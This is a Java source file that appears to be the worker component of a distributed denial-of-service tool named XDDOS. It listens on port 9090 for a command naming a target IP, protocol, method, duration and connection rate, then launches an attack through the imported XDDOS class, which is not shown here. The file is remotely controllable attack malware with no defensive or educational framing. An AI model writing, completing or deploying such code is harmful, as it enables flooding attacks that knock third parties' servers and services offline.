package XD.WORKER;

import XD.XDDOS.XDDOS;

import java.io.BufferedReader;
import java.net.ServerSocket;
import java.net.Socket;
public class Main {
    public static void main(String[] args) throws Throwable {
        ServerSocket serever = new ServerSocket(9090);
        Socket socket = serever.accept();
        BufferedReader reader = new BufferedReader(new java.io.InputStreamReader(socket.getInputStream()));
        String line = reader.readLine();
        String ip = line.split(" ")[0];
        int protocol = Integer.parseInt(line.split(" ")[1]);
        String method = line.split(" ")[2];
        int time = Integer.parseInt(line.split(" ")[3]);
        int CPS = Integer.parseInt(line.split(" ")[4]);
        if(XDDOS.attackIsRunning){
            socket.getOutputStream().write("An attack is already running".getBytes());
            socket.getOutputStream().flush();
        }
        else{
            XDDOS.attackIsRunning = true;
            XDDOS.main(ip, protocol, method, time, CPS);
            socket.getOutputStream().write("Attack started".getBytes());
            socket.getOutputStream().flush();
        }
    }
}
